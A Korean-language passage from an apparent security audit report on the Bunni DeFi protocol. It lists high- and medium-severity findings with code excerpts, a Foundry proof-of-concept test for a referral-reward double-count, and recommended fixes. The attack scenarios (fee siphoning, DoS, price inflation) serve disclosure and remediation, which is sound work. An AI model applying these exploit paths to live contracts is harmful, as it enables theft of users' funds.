다음 테스트는 초기에 `depositor1`과 `depositor2`가 각각 `referrer1`과 `referrer2`를 사용하여 `1 ether`를 예금하는 방법을 보여줍니다. 그런 다음 소유자가 `1 ether`를 보상으로 분배하여 각 예금자는 `0.5 ether`를 갖게 됩니다. 그 후 `depositor1`은 `0.5 ether` 보상을 청구합니다. 그 후 **`depositor1`은 `0.1 ether` 상당의 토큰을 발행하지만 이번에는 다른 추천인을 지정하여** `referrer2`로 변경합니다. 이로 인해 `referrer2`의 점수가 증가하고 `referrer2`가 청구할 수 있는 보상도 증가합니다. 이는 점수를 여러 번 청구할 수 있게 하므로 잘못된 것입니다.

```solidity
    function test_claim_mint_doubleCount() public {
        bool isToken0 = true;
        uint256 amountToDistribute = 1 ether;
        // register depositors and referrers
        address depositor1 = makeAddr("depositor1");
        address referrer1Address = makeAddr("referrer1");
        hub.setReferrerAddress(1, referrer1Address);
        address depositor2 = makeAddr("depositor2");
        address referrer2Address = makeAddr("referrer2");
        hub.setReferrerAddress(2, referrer2Address);
        //
        // 1. `Depositor1` deposits 1 ether. referrer1 gets score
        console.log("Depositor1 deposits token using referrer1");
        _makeDeposit(key, 1 ether, 1 ether, depositor1, 1);
        console.log("ScoreOf referrer1", bunniToken.scoreOf(1));
        //
        // 2. `Depositor2` deposits 1 ether. referrer2 gets score.
        console.log("Depositor2 deposits token using referrer2");
        _makeDeposit(key, 1 ether, 1 ether, depositor2, 2);
        console.log("ScoreOf referrer2", bunniToken.scoreOf(2));
        //
        // 3. Distribute rewards to the `BunniToken`
        console.log("\nOwner distributes 1 ether rewards...");
        Currency token = isToken0 ? currency0 : currency1;
        poolManager.unlock(abi.encode(token, amountToDistribute));
        bunniToken.distributeReferralRewards(isToken0, amountToDistribute);
        //
        // 4. Malicious `Depositor1` deposits 0.1 ether again but he changes the referrer1 to referrer2
        console.log("\nMalicious Depositor1 deposits more token using referrer2 (referrer is modified)");
        _makeDeposit(key, 0.1 ether, 0.1 ether, depositor1, 2);
        (referrer1Reward0, referrer1Reward1) = bunniToken.getClaimableReferralRewards(1);
        (referrer2Reward0, referrer2Reward1) = bunniToken.getClaimableReferralRewards(2);
        (uint256 referrer3Reward0, uint256 referrer3Reward1) = bunniToken.getClaimableReferralRewards(3);
        console.log("ScoreOf referrer1", bunniToken.scoreOf(1));
        console.log("ScoreOf referrer2", bunniToken.scoreOf(2));
        console.log("Rewards claimable by referrer1", referrer1Reward0, referrer1Reward1);
        console.log("Rewards claimable by referrer2", referrer2Reward0, referrer2Reward1);
    }
```

결국 `referrer2`는 `1.04 eth (1049999999999999499)`를 청구할 수 있음을 관찰할 수 있는데, 이는 잘못된 것입니다. 그들은 `0.5 eth (500000000000000000)` 더하기 `0.04 eth (49999999999999499)`만 청구할 수 있어야 합니다:

```bash
Ran 1 test for test/BunniToken.t.sol:BunniTokenTest
[PASS] test_claim_mint_doubleCount() (gas: 1105750)
Logs:
  Depositor1 deposits token using referrer1
  ScoreOf referrer1 999999999999999000
  Depositor2 deposits token using referrer2
  ScoreOf referrer2 1000000000000000000

The owner distributes 1 ether rewards...
  ScoreOf referrer1 999999999999999000
  ScoreOf referrer2 1000000000000000000
  Rewards claimed by referrer1 499999999999999500 0
  Rewards claimable by referrer2 500000000000000000 0

Malicious Depositor1 deposits more token using referrer2 (referrer is modified)
  ScoreOf referrer1 0
  ScoreOf referrer2 2099999999999998998
  Rewards claimable by referrer1 0 0
  Rewards claimable by referrer2 1049999999999999499 0
```

이 문제는 `ERC20Referrer::_mint`가 호출되고 추천인이 변경될 때 발생합니다. `score`는 새 추천인에게 이전됩니다. 그러나 한 추천인에서 다른 추천인으로 변경할 때 `score`가 이전될 추천인에게 할당된 보상은 청구되지 않습니다. 이로 인해 점수가 두 번 계산되어 보상을 계산하는 함수에서 다시 사용될 수 있습니다.

## 권장 사항

예금자가 추천인을 변경하는 경우 `score`를 이전하기 전에 `score`가 이전될 추천인에게 할당된 보상을 처리하는 것이 좋습니다.

# [H-01] 잠금 해제(unlock) 프로세스 전에 호출된 `poolManager.sync` 함수

## 심각도

**영향:** 중간 (Medium)

**가능성:** 높음 (High)

## 설명

`BunniHook` 계약에는 `BunniHook#L501` 라인에서 `poolManager.sync` 함수 호출이 있으며, 이는 `BunniHook#L505` 라인의 `unlock` 프로세스 시작보다 먼저 옵니다.

```solidity
File: BunniHook.sol
465:     function rebalanceOrderPostHook(RebalanceOrderHookArgs calldata hookArgs) external override nonReentrant {
...
...
500:         // posthook should wrap output tokens as claim tokens and push it from BunniHook to BunniHub and update pool balances
501:>>>      poolManager.sync(args.currency);
502:         if (!args.currency.isNative()) {
503:             Currency.unwrap(args.currency).safeTransfer(address(poolManager), orderOutputAmount);
504:         }
505:>>>      poolManager.unlock(
506:             abi.encode(
507:                 HookUnlockCallbackType.REBALANCE_POSTHOOK,
508:                 abi.encode(args.currency, orderOutputAmount, hookArgs.key, hookArgs.key.currency0 == args.currency)
509:             )
510:         );
511:     }
```

`poolManager` 계약의 [`sync`](https://github.com/Uniswap/v4-core/blob/18b223cab19dc778d9d287a82d29fee3e99162b0/src/PoolManager.sol#L280) 함수는 수정자 [`onlyWhenUnlocked`](https://github.com/Uniswap/v4-core/blob/18b223cab19dc778d9d287a82d29fee3e99162b0/src/PoolManager.sol#L96)에 의해 보호되며, 이는 `unlock` 프로세스가 이미 시작된 경우에만 호출될 수 있도록 보장합니다.

```solidity
    ...
    ...
    modifier onlyWhenUnlocked() {
        if (!Lock.isUnlocked()) ManagerLocked.selector.revertWith();
        _;
    }
    ...
    ...
    function sync(Currency currency) external onlyWhenUnlocked {
        // address(0) is used for the native currency
        if (currency.isAddressZero()) {
            // The reserves balance is not used for native settling, so we only need to reset the currency.
            CurrencyReserves.resetCurrency();
        } else {
            uint256 balance = currency.balanceOfSelf();
            CurrencyReserves.syncCurrencyAndReserves(currency, balance);
        }
    }
```

`unlock` 프로세스가 `BunniHook#L505` 라인까지 시작되지 않으므로 501 라인의 `sync` 호출은 실패하여 트랜잭션이 되돌려지고 리밸런싱 작업이 실패하게 됩니다. 풀 균형을 보장할 수 있는 대체 메커니즘이 없으므로 이러한 실패는 불균형한 풀로 이어질 수 있습니다.

## 권장 사항

이 문제를 해결하려면 `sync` 함수 호출과 잠재적인 `safeTransfer` 작업(`BunniHook#L503`)을 `REBALANCE_POSTHOOK` 콜백 내부로 이동해야 합니다. 이렇게 하면 풀을 동기화하기 전에 잠금 해제 프로세스가 시작됩니다.

# [H-02] amAMM 관리자가 프로토콜 및 추천인으로부터 수수료를 가로챌 수 있음

## 심각도

**영향:** 높음 (High)

**가능성:** 중간 (Medium)

## 설명

amAMM 관리자는 수익을 극대화하기 위해 스왑 수수료를 설정하고 조정할 수 있습니다. 관리자가 획득한 수수료의 일정 비율은 프로토콜과 추천인에게 분배됩니다.

그러나 관리자는 스와퍼(swapper)와 Bunni 프로토콜 사이의 프록시 역할을 하여 모든 수수료를 보유할 수 있습니다. Bunni 프로토콜의 스왑 수수료를 최대로 설정하고 자신의 프록시 계약을 통해 실행되는 스왑에서 더 낮은 수수료를 제공함으로써 사용자들이 항상 관리자 계약과 상호 작용하도록 유도할 수 있습니다.

관리자 계약에서 스왑 흐름은 다음과 같습니다:

- 스와퍼로부터 입력 토큰을 받습니다.
- Bunni 프로토콜의 스왑 수수료를 0으로 설정하고 수수료 없이 스왑을 수행합니다.
- 관리자 계약 자체 내에서 수수료 보유를 관리하고 적절한 출력 토큰 금액을 스와퍼에게 보냅니다.
- Bunni 프로토콜의 스왑 수수료를 최대 값으로 설정합니다.

결과적으로 프로토콜과 추천인은 수수료를 받지 못하고 관리자가 스왑 수수료 전액을 가로챕니다.

풀과 현재 topBid에 따라 다른 관리자 계약과 상호 작용해야 하는 것이 사용자가 관리자 계약과 상호 작용할 가능성을 줄일 것이라고 주장할 수 있습니다. 그러나 관리자가 이 전략을 수행하고 모든 사용자가 상호 작용하도록 유도하기 위해 표준 프록시 스와퍼 계약이 생성될 가능성이 높습니다.

## 개념 증명 (Proof of Concept)

USDC/XYZ 쌍의 Bunni 풀에서 다음과 같은 시나리오를 상상해 보세요:

- `hookFeeModifier`는 10%입니다.
- `referralRewardModifier`는 10%입니다.
- 현재 환율은 1 USDC = 1 XYZ입니다.
- 현재 시장 상황에서 "공정한" 수수료 값은 1%입니다.
- 현재 amAMM 수수료는 10%로 설정되어 있지만 관리자 계약은 1% 수수료로 스왑을 제공합니다.
- Alice는 1,000 USDC를 XYZ로 스왑하고 싶어 하므로 관리자 계약을 통해 수행합니다.
- Alice의 스왑을 처리하기 위해 관리자 계약은 amAMM 수수료를 0으로 설정하고 스왑을 수행하고 출력 금액의 1%를 수수료(10 XYZ)로 보유하고 나머지를 Alice에게 보냅니다(990 XYZ).

예상되는 결과는 관리자가 9 XYZ, 프로토콜이 0.9 XYZ, 추천인이 0.1 XYZ를 받는 것입니다. 그러나 관리자는 프로토콜과 추천인의 수수료를 가로챘습니다.

## 권장 사항

항상 수수료 재정의 또는 동적 스왑 수수료를 훅 수수료 계산의 기준으로 사용하세요.

# [H-03] 하나의 볼트만 사용할 때 주가 상승이 샌드위치 공격으로 이어질 수 있음

## 심각도

**영향:** 높음 (High)

**가능성:** 중간 (Medium)

## 설명

서지 수수료(surge fee)는 LDF 업데이트, 재담보 수익 또는 자율 리밸런싱으로 인해 발생할 수 있는 자율 유동성 수정 중 샌드위치 공격을 방지하기 위한 메커니즘입니다.

`BunniHookLogic`의 `beforeSwap` 함수는 이러한 변경 사항을 확인하고 재담보 수익의 변경 확인은 `_shouldSurgeFromVaults` 함수에서 수행됩니다. 이 함수는 두 볼트가 모두 사용 중일 때만 확인을 수행하는데, 하나의 볼트만 사용할 때는 총 유동성이 변경되지 않을 것이라고 가정하기 때문입니다. 그러나 풀의 토큰이 불균형하고 유동성이 적은 토큰만 볼트를 사용하는 경우 볼트의 주가 상승은 총 유동성을 증가시켜 샌드위치 공격으로 이어질 수 있습니다.

## 권장 사항

볼트 중 하나만 사용 중일 때도 볼트의 서지를 확인하세요. `BunniHookLogic`에서 수행된 모든 변경 사항은 정확한 견적을 제공하기 위해 `BunniQuoter`에서도 수행되어야 합니다.

# [H-04] 공격자가 리밸런싱 메커니즘을 DoS 공격할 수 있음

## 심각도

**영향:** 중간 (Medium)

**가능성:** 높음 (High)

## 설명

코드가 `rebalanceOrderPreHook()` 함수에서 리밸런싱을 수행하려고 할 때 코드는 BunniHook 토큰 잔액이 주문 금액인 `amount`와 같은지 확인합니다.

```solidity
        // ensure we have exactly args.amount tokens
        if (args.currency.balanceOfSelf() != args.amount) {
            revert BunniHook__PrehookPostConditionFailed();
        }
```

문제는 BunniHook 계약이 am-AMM이 활성화될 때 관리자의 수수료를 포함할 수 있으며, 공격자가 am-AMM이 활성화될 때 확인이 참이 되지 않도록 소량의 토큰을 BunniHook에 기부할 수 있다는 것입니다. 또한 공격자는 토큰을 기부하여 다른 때에도 이를 거짓으로 만들 수 있습니다. 영향은 자율 리밸런싱 메커니즘이 작동하지 않는다는 것입니다.

## 권장 사항

계약의 토큰 잔액 증가가 전체 잔액이 아니라 `args.amount`와 같은지 확인하세요.

# [H-05] permit2 주문에 대해 동일한 블록 번호를 nonce로 사용함

## 심각도

**영향:** 중간 (Medium)

**가능성:** 높음 (High)

## 설명

BunniHook에서 코드가 Flood.bid 주문을 생성하려고 할 때 `block.number`를 permit2 서명의 nonce로 사용합니다.

```solidity
        IFloodPlain.Order memory order = IFloodPlain.Order({
            offerer: address(this),
            zone: address(env.floodZone),
            recipient: address(this),
            offer: offer,
            consideration: consideration,
            deadline: block.timestamp + rebalanceOrderTTL,
            nonce: block.number,
            preHooks: preHooks,
            postHooks: postHooks
        });
```

문제는 같은 블록에 여러 리밸런싱 주문이 있는 경우 Permi2가 동일한 nonce를 두 번 사용하는 것을 허용하지 않으므로 그중 하나만 실행된다는 것입니다. Flood는 Permit2의 `permitWitnessTransferFrom()`/`_permitTransferFrom()` 함수를 사용하여 토큰을 전송하며, 이들은 동일한 nonce가 두 번 사용되는 것을 허용하지 않습니다.

BunniHook은 모든 풀 리밸런싱 주문을 처리하므로 이 문제로 인해 같은 블록에서 두 번의 리밸런싱이 발생할 수 없으며 공격 없이도 일부 리밸런싱이 발생하지 않습니다. 또한 공격자는 이 문제를 이용하여 각 블록에 가짜 풀에 대한 리밸런싱을 생성함으로써(또는 공격자가 리밸런싱 생성을 선행 실행하고 자신의 풀에 대한 리밸런싱을 생성함으로써) 풀의 리밸런싱을 방지할 수 있습니다.

## 권장 사항

풀의 ID와 블록 타임스탬프의 조합을 기반으로 nonce를 사용하세요.

# [M-01] 악의적인 LP가 출금 요청을 빈번하게 생성하여 출금 지연을 무력화할 수 있음

## 심각도

**영향:** 중간 (Medium)

**가능성:** 중간 (Medium)

## 설명

토큰을 인출하려면 LP 제공자는 먼저 인출 요청을 생성해야 하며 1분 지연 후 15분 동안 인출을 완료할 수 있습니다. 문제는 공격자가 16분마다 인출 요청을 생성할 수 있으며, 이 방식으로 15분 동안 인출할 수 있고 시간의 약 6%만 즉시 인출을 수행할 수 없다는 것입니다(기다려야 하는 1분의 지연 시간 동안만). 이 공격은 인출 지연 메커니즘을 약화시킬 것입니다.

## 권장 사항

인출 요청에 대해 페널티를 부과하거나, 인출 요청에 지정된 토큰에 대해 수수료 및 보상 적립을 중지하거나, 유예 기간 시간을 줄이세요.

# [M-02] 입금 중 잘못된 예비 금액(reserve amount) 처리

## 심각도

**영향:** 중간 (Medium)

**가능성:** 중간 (Medium)

## 설명

`BunniHubLogic` 계약에는 입금 프로세스 중 오래된 예비 금액 사용과 관련된 문제가 있습니다. 구체적으로 193 라인에서 훅렛(hooklet)이 호출될 때 전송되는 `amount` 매개변수는 144 라인에서 계산된 실제 입금 금액을 반영하지 않습니다. 이러한 불일치는 `amount`가 144 및 153 라인의 최근 입금을 고려하여 업데이트되지 않은 이전 `reserveAmount` 값을 여전히 참조하기 때문에 발생합니다.

또한, 이 오래된 금액에 의존하는 167 라인의 슬리피지(slippage) 확인도 잘못 통과되어 불일치를 초래할 수 있습니다.

```solidity
File: BunniHubLogic.sol
073:     function deposit(HubStorage storage s, Env calldata env, IBunniHub.DepositParams calldata params)
074:         external
075:         returns (uint256 shares, uint256 amount0, uint256 amount1)
076:     {
...
...
104:         uint256 reserveAmount0 = depositReturnData.reserveAmount0;
105:         uint256 reserveAmount1 = depositReturnData.reserveAmount1;
106:>>>      amount0 = depositReturnData.amount0;
107:>>>      amount1 = depositReturnData.amount1;
...
...
114:         (uint256 rawAmount0, uint256 rawAmount1) = (
115:>>>          address(state.vault0) != address(0) ? amount0 - reserveAmount0 : amount0,
116:>>>          address(state.vault1) != address(0) ? amount1 - reserveAmount1 : amount1
117:         );
...
...
136:         // update reserves
137:         if (address(state.vault0) != address(0) && reserveAmount0 != 0) {
138:             (uint256 reserveChange, uint256 reserveChangeInUnderlying) = _depositVaultReserve(
139:                 env, reserveAmount0, params.poolKey.currency0, state.vault0, msgSender, params.vaultFee0
140:             );
141:             s.reserve0[poolId] = state.reserve0 + reserveChange;
142:
143:             // use actual withdrawable value to handle vaults with withdrawal fees
144:>>>          reserveAmount0 = reserveChangeInUnderlying;
145:         }
146:         if (address(state.vault1) != address(0) && reserveAmount1 != 0) {
147:             (uint256 reserveChange, uint256 reserveChangeInUnderlying) = _depositVaultReserve(
148:                 env, reserveAmount1, params.poolKey.currency1, state.vault1, msgSender, params.vaultFee1
149:             );
150:             s.reserve1[poolId] = state.reserve1 + reserveChange;
151:
152:             // use actual withdrawable value to handle vaults with withdrawal fees
153:>>>          reserveAmount1 = reserveChangeInUnderlying;
154:         }
155:
156:         // mint shares using actual token amounts
157:         shares = _mintShares(
158:             state.bunniToken,
159:             params.recipient,
160:>>>          address(state.vault0) != address(0) ? rawAmount0 + reserveAmount0 : rawAmount0,
161:             depositReturnData.balance0,
162:>>>          address(state.vault1) != address(0) ? rawAmount1 + reserveAmount1 : rawAmount1,
163:             depositReturnData.balance1,
164:             params.referrer
165:         );
166:
167:>>>      if (amount0 < params.amount0Min || amount1 < params.amount1Min) {
168:             revert BunniHub__SlippageTooHigh();
169:         }
...
...
193:>>>      state.hooklet.hookletAfterDeposit(
194:>>>          msgSender, params, IHooklet.DepositReturnData({shares: shares, amount0: amount0, amount1: amount1})
195:         );
196:     }
```

160 및 162 라인에서 볼 수 있듯이 발행은 새로 계산된 `reserveAmount0` 및 `reserveAmount1`에 따라 수행됩니다. 그러나 슬리피지 확인 중이나 훅렛을 호출할 때 새로운 `reserveAmount`는 `amount` 변수에 반영되지 않습니다. 훅렛은 볼트의 수수료 부과 토큰 등 다양한 작업을 위해 구현될 수 있으며, `amount`가 현재 입금된 금액을 정확하게 반영하지 않으면 훅렛은 잘못된 정보로 작동하게 됩니다.

## 권장 사항

이 문제를 완화하려면 훅렛 호출 및 슬리피지 확인 수행과 같은 후속 작업에 사용되기 전에 실제 입금 금액을 반영하도록 `amount` 매개변수를 다시 계산해야 합니다.

```diff
    function deposit(HubStorage storage s, Env calldata env, IBunniHub.DepositParams calldata params)
        external
        returns (uint256 shares, uint256 amount0, uint256 amount1)
    {
        ...
        ...
        // update reserves
        if (address(state.vault0) != address(0) && reserveAmount0 != 0) {
            (uint256 reserveChange, uint256 reserveChangeInUnderlying) = _depositVaultReserve(
                env, reserveAmount0, params.poolKey.currency0, state.vault0, msgSender, params.vaultFee0
            );
            s.reserve0[poolId] = state.reserve0 + reserveChange;

            // use actual withdrawable value to handle vaults with withdrawal fees
            reserveAmount0 = reserveChangeInUnderlying;
        }
        if (address(state.vault1) != address(0) && reserveAmount1 != 0) {
            (uint256 reserveChange, uint256 reserveChangeInUnderlying) = _depositVaultReserve(
                env, reserveAmount1, params.poolKey.currency1, state.vault1, msgSender, params.vaultFee1
            );
            s.reserve1[poolId] = state.reserve1 + reserveChange;

            // use actual withdrawable value to handle vaults with withdrawal fees
            reserveAmount1 = reserveChangeInUnderlying;
        }

        // mint shares using actual token amounts
        shares = _mintShares(
            state.bunniToken,
            params.recipient,
            address(state.vault0) != address(0) ? rawAmount0 + reserveAmount0 : rawAmount0,
            depositReturnData.balance0,
            address(state.vault1) != address(0) ? rawAmount1 + reserveAmount1 : rawAmount1,
            depositReturnData.balance1,
            params.referrer
        );

+       amount0 = rawAmount0 + reserveAmount0;
+       amount1 = rawAmount1 + reserveAmount1;

        if (amount0 < params.amount0Min || amount1 < params.amount1Min) {
            revert BunniHub__SlippageTooHigh();
        }

        // refund excess ETH
        if (params.poolKey.currency0.isNative()) {
            if (address(this).balance != 0) {
                params.refundRecipient.safeTransferETH(
                    FixedPointMathLib.min(address(this).balance, msg.value - amount0)
                );
            }
        } else if (params.poolKey.currency1.isNative()) {
            if (address(this).balance != 0) {
                params.refundRecipient.safeTransferETH(
                    FixedPointMathLib.min(address(this).balance, msg.value - amount1)
                );
            }
        }

        // emit event
        emit IBunniHub.Deposit(msgSender, params.recipient, poolId, amount0, amount1, shares);

        /// -----------------------------------------------------------------------
        /// Hooklet call
        /// -----------------------------------------------------------------------

        state.hooklet.hookletAfterDeposit(
            msgSender, params, IHooklet.DepositReturnData({shares: shares, amount0: amount0, amount1: amount1})
        );
    }
```

# [M-03] 풀에 대해 amAMM이 비활성화되면 입찰 자금이 잠길 수 있음

## 심각도

**영향:** 높음 (High)

**가능성:** 낮음 (Low)

## 설명

amAMM은 풀 및 전역 재정의(override)를 통해 풀에 대해 비활성화할 수 있습니다.

amAMM 계약과의 모든 상호 작용은 작업에 관련된 풀에 대해 활성화되어 있어야 합니다.

amAMM이 활성화된 후 풀에 대해 비활성화되면 다음과 같이 입찰자의 자금이 잠길 수 있습니다.

- 보류 중인 환불을 청구할 수 없습니다.
- `nextBid`를 취소할 수 없으므로 예치금이 잠깁니다.
- `topBid` 잔여 예치금을 회수할 수 없습니다.

## 권장 사항

`claimRefund`, `cancelNextBid`, `withdrawFromNextBid` 및 `withdrawFromTopBid`에서 amAMM이 활성화되어 있어야 한다는 요구 사항을 제거하는 것을 고려하세요.

또한 amAMM이 활성화되지 않은 경우 취소 및 인출 조건을 완화하여 관리자가 항상 예치금을 돌려받을 수 있도록 하세요.

# [M-04] 풀 생성 후 첫 24시간 동안의 스왑은 amAMM을 사용할 수 없음

## 심각도

**영향:** 낮음 (Low)

**가능성:** 높음 (High)

## 설명

풀이 생성될 때 amAMM은 초기에 상태 A(top bid 없음, next bid 없음)에 있습니다. 첫 번째 top bid가 설정되려면(상태 B) 최소 K 에포크(24시간)가 지나야 합니다.

이는 거래 첫날에 풀이 MEV를 다시 캡처하고 스왑 수수료 수익을 최적화하기 위해 amAMM 메커니즘을 사용할 수 없음을 의미합니다. 풀 생성의 처음 몇 시간 동안 거래량이 매우 많을 것으로 예상되므로 이 기간 동안 이 메커니즘을 사용하는 것이 특히 중요합니다.

## 권장 사항

풀 생성시 임의의 초기 top bid를 할당할 수 있도록 허용하세요.

# [M-05] 새로운 입찰이 제출되지 않을 때까지 `nextBid`의 `topBid` 승격이 지연될 수 있음

## 심각도

**영향:** 중간 (Medium)

**가능성:** 중간 (Medium)

## 설명

amAMM에 topBid가 없으면 마지막 topBid가 설정된 에포크 이후 K 에포크가 지날 때까지 nextBid가 topBid로 승격될 수 없습니다. 즉, nextBid가 업데이트될 때마다 topBid로의 승격이 `current epoch - previous nextBid epoch`만큼 지연됩니다.

다음 예를 살펴보겠습니다:

- 에포크 100에 topBid가 없고 새로운 nextBid가 생성됩니다. 다음 관리자는 에포크 124에 설정될 수 있습니다.
- 에포크 120에 더 높은 nextBid가 생성됩니다. 다음 관리자는 이제 에포크 144까지 설정될 수 없습니다.
- 에포크 140에 더 높은 nextBid가 생성됩니다. 다음 관리자는 이제 에포크 164까지 설정될 수 없습니다.

이는 topBid가 없는 기간, 즉 amAMM 보호가 없고 인출 대기열을 사용할 필요가 없는 기간이 새로운 입찰이 제출되는 동안 연장됨을 의미합니다. 이는 유기적으로 발생할 수도 있고, MEV 공격을 수행하기 위해 amAMM 보호가 없는 더 긴 기간을 이용하려는 공격자에 의해 유발될 수도 있습니다.

## 권장 사항

새로운 입찰이 생성될 때 nextBid의 `epoch`를 업데이트하지 않는 것을 고려하세요. 이렇게 하면 topBid로의 승격이 이전 nextBid가 생성된 이후 경과한 시간만큼 지연되지 않습니다.

# [M-06] `address(0)`에 대한 잘못된 추천인 보상 계산으로 자금 손실이 발생할 수 있음

## 심각도

**영향:** 중간 (Medium)

**가능성:** 중간 (Medium)

## 설명

사용자가 Bunni 토큰을 전송할 때 코드는 `_beforeTokenTransfer(from, to, amount)`를 호출하여 `from` 및 `to` 추천인 청구 상태를 업데이트합니다. 사용자가 토큰을 소각할 때(코드가 `_beforeTokenTransfer(from, 0, amount)` 호출) 제로 주소 청구 상태를 업데이트하지 않도록 하기 위해 `to`가 0이면 `to`에 대한 청구 상태를 업데이트하지 않습니다.

```solidity
 function _beforeTokenTransfer(address from, address to, uint256) internal override {
--snip--
        if (from != address(0)) {
--snip--
        }
        if (to != address(0)) {
--snip--
        }
    }
```

문제는 사용자가 일부 토큰을 제로 주소로 전송할 수 있으며, 그러면 제로 추천인의 청구 상태도 업데이트되지 않고 제로 추천인의 점수는 업데이트되지만 코드는 제로 주소의 추천인 보상을 적립하지 않아 미래에 제로 주소 추천인에 대한 보상 계산이 실제보다 높아질 것입니다. 제로 주소 추천인의 기본 소유자는 프로토콜 관리자입니다.
사용자가 Bunni 토큰을 제로 주소로 전송할 수 있는 여러 가지 이유가 있습니다. 하나는 어떤 상황에서는 이 공격이 Bunni 토큰 손실보다 더 수익성이 높을 수 있기 때문입니다(제로 주소 추천인의 소유자는 0 주소로 일부 토큰을 전송하고 추천인 보상으로 더 많은 토큰을 청구할 것입니다).
두 번째 시나리오는 많은 프로젝트에서 커뮤니티나 프로젝트 팀이 LP 토큰을 영원히 잠그기 위해 0 주소로 일부 LP 토큰을 보내 사용자가 프로토콜 토큰을 팔고 싶을 때 항상 유동성이 있음을 확신하도록 하는데, LP 토큰(Bunni 토큰)을 0 주소로 보낼 때 이 문제가 발생합니다.

## 권장 사항

Bunni 토큰이 제로 주소로 전송될 때 제로 주소 추천인 점수를 업데이트하세요.

# [M-07] Bunni 토큰에 대해 가격 인플레이션 공격을 수행할 수 있음

## 심각도

**영향:** 낮음 (Low)

**가능성:** 높음 (High)

## 설명

첫 번째 예금자가 풀에 토큰을 예금하면 코드는 제로 주소에 대해 `1e3` Bunni 토큰을 발행하고 예금자에 대해 `1e18 - 1e3`을 발행합니다. 문제는 Bunni 토큰이 사용자가 토큰을 소각할 수 있도록 허용하고 첫 번째 예금자가 자신의 Bunni 토큰을 소각하면 Bunni 토큰의 총 공급량은 1000이 되는 반면 풀 토큰은 첫 번째 예금자가 원하는 만큼 커질 수 있다는 것입니다.

```solidity
        uint256 existingShareSupply = shareToken.totalSupply();
        if (existingShareSupply == 0) {
            // no existing shares, just give WAD
            shares = WAD - MIN_INITIAL_SHARES;
            shareToken.mint(address(0), MIN_INITIAL_SHARES, 0);
```

예를 들어, 첫 번째 예금자가 `1e21` 토큰(풀 토큰 중 하나에 대해)을 예금한 다음 받은 Bunni 토큰을 소각하면 풀 토큰에 대한 Bunni 토큰 비율은 `1e18`이 되고, 예금 또는 인출 시 반올림 오류가 `1e18`만큼 커져 사용자는 각 예금 또는 인출 시 자금을 잃게 됩니다. 풀이 수수료를 받으면 LP 가격은 시간이 지남에 따라 더 높아지고 반올림 오류도 증가합니다.

## 권장 사항

공격의 영향을 줄이기 위해 제로 주소에 대해 `1e6`을 발행하세요.

# [M-08] 사용자가 이전 에포크의 마지막 몇 분에 유동성을 예치하고 수수료를 얻을 수 있음

## 심각도

**영향:** 중간 (Medium)

**가능성:** 중간 (Medium)

## 설명

am-AMM이 활성화되면 BunniHook 코드는 임대료를 BunniToken(LP)으로 징수하고 새로운 에포크가 시작될 때 각 에포크의 임대료를 소각합니다.

```solidity
        // burn rent charged
        if (rentCharged != 0) {
            _burnBidToken(id, rentCharged);
        }
```

각 에포크는 1시간이며 코드는 전체 에포크 임대료를 한순간에 유동성 공급자에게 분배합니다. 문제는 사용자가 이전 에포크의 마지막 순간에 유동성을 예금하고 여전히 임대료를 받을 수 있다는 것입니다. 코드는 각 예금 전에 임대료를 분배하여 선행 실행(front-runners)을 방지하지만, 이전 에포크의 마지막 몇 분에 예금하여 임대료 보상을 받고 인출하는 공격은 막지 못합니다. 이렇게 하면 공격자의 자금은 1~2분 동안(인출 지연이 있는 경우) 차단되지만 지난 1시간 동안의 수수료 보상을 받게 됩니다.

## 권장 사항

유동성 공급자에게 에포크 보상을 시간에 따라 분배하세요.

# [M-09] amAMM 활성화 여부 확인

## 심각도

**영향:** 중간 (Medium)

**가능성:** 중간 (Medium)

## 설명

`BunniHook` 계약에서 `amAmmEnabledOverride` 및 `globalAmAmmEnabledOverride`는 `hookParams.amAmmEnabled` 값보다 우선하여 amAMM이 활성화되었는지 확인하는 데 사용됩니다. 따라서 `hookParams.amAmmEnabled`가 `true`로 설정된 경우에도 amAMM을 비활성화하는 데 사용할 수 있습니다.

```solidity
/// @notice Enables/disables am-AMM globally. Takes precedence over amAmmEnabled in hookParams, overridden by amAmmEnabledOverride.
BoolOverride internal globalAmAmmEnabledOverride;
```

그러나 `BunniHookLogic.beforeSwap`에서는 `amAmmEnabledOverride` 및 `globalAmAmmEnabledOverride` 값이 amAMM 활성화 여부를 확인하는 데 사용되지 않습니다. `hookParams.amAmmEnabled` 값이 참이고 top bid가 존재하는 경우 `amAmmSwapFee`가 스왑에 사용되며 수수료의 일부가 amAMM 관리자에게 적립됩니다.

```solidity
if (hookParams.amAmmEnabled) {
    bytes7 payload;
    IAmAmm.Bid memory topBid = IAmAmm(address(this)).getTopBidWrite(id);
    (amAmmManager, payload) = (topBid.manager, topBid.payload);
    uint24 swapFee0For1;
    uint24 swapFee1For0;
    (swapFee0For1, swapFee1For0, amAmmEnableSurgeFee) = decodeAmAmmPayload(payload);
    amAmmSwapFee = params.zeroForOne ? swapFee0For1 : swapFee1For0;
}
```

프로토콜 관리자는 규정 준수 또는 평판이 나쁜 관리자가 스왑 수수료를 설정하는 것을 방지하는 등 다양한 이유로 특정 풀에 대해 amAMM을 비활성화하고 싶을 수 있습니다.

프로토콜 관리자가 `amAmmEnabledOverride`를 거짓으로 설정하면 관리자는 스왑 수수료를 변경할 수 없고 새로운 입찰도 생성될 수 없습니다. 결과적으로 모든 스왑은 시장 상황에 맞춰 수수료를 조정할 수 없는 상태에서 관리자가 설정한 최신 스왑 수수료로 실행되며, 관리자는 스왑에서 수수료를 계속 받게 됩니다. 이 상황은 프로토콜 관리자가 풀에 대해 amAMM을 다시 활성화하거나 관리자 예치금이 고갈될 때까지 지속됩니다.

동일한 문제가 `BunniQuoter.quoteSwap` 함수에도 존재합니다.

## 권장 사항

`BunniHookLogic` 및 `BunniQuoter`에서 amAMM이 활성화되었는지 확인하기 위해 `hookParams.amAmmEnabled` 대신 `BunniHook.getAmAmmEnabled()`를 사용하세요.
# [M-10] 볼트가 더 많은 토큰을 허용하지 않는 경우 `deposit` DoS 발생

## 심각도

**영향:** 중간 (Medium)

**가능성:** 중간 (Medium)

## 설명

`BunniHub`에 예금할 때 풀이 재담보를 위해 볼트를 사용하는 경우 입금된 금액의 일부가 볼트로 전송됩니다.

그러나 볼트가 전송된 금액을 수용할 수 있는지 확인하지 않습니다. 최대 예금 금액에 도달하거나 볼트가 일시적으로 일시 중지되는 등 다양한 이유로 볼트가 예금을 수락하지 못할 수 있습니다. 이러한 시나리오에서 예금 트랜잭션이 되돌려져(revert), LP가 `BunniHub`에 토큰을 예금할 수 없게 됩니다.

## 권장 사항

